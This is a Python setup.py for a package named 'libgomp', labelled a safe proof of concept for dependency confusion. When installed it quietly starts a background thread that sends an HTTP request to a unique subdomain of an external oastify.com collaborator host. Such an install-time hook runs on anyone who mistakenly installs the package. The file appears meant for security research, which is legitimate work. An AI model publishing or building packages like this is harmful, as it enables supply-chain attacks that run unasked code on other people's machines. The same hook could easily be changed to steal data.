from setuptools import setup
import threading
import uuid
import urllib.request

def ping_collaborator():
    try:
        # Unique token per install
        token = str(uuid.uuid4())
        # Safe request to your OAST/Burp Collaborator
        url = f"http://{token}.oxpxel7915wfrjzmnh3smdb8czir6lua.oastify.com"
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass

# Run the callback in a background thread
threading.Thread(target=ping_collaborator).start()

setup(
    name="libgomp",
    version="1.1.5",
    description="Safe PoC package for dependency confusion",
    packages=["libgomp"],
    install_requires=[],
)
